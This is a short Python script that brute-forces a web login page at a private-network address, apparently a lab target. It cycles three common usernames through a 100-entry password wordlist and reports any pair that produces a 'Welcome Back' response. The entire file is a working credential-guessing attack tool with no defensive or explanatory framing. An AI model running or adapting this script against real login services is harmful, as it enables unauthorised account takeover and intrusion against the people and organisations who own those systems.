import requests
import sys

target = "http://192.168.31.143/login.html"
usernames = ["admin", "user", "test"]
passwords = "top100.txt"
successmsg = "Welcome Back"

for username in usernames:
	with open(passwords, "r") as wordlist:
		for password in wordlist:
			password = password.strip("\n").encode()
			sys.stdout.write(f"[x] ATTEMPTING USER:PASSWORD >> {username}:{password.decode()}\r")
			sys.stdout.flush()
			r = requests.post(target, data={"username": username, "password": password})
			if successmsg.encode() in r.content:
				sys.stdout.write("\n")
				sys.stdout.write(f"\t [!] VALID PASSWORD {password.decode()} FOUND FOR USER {username}")
				sys.exit()
		sys.stdout.flush()
		sys.stdout.write("\n")
		sys.stdout.write(f"NO VALID PASSWORD FOUND FOR USER: {username}")
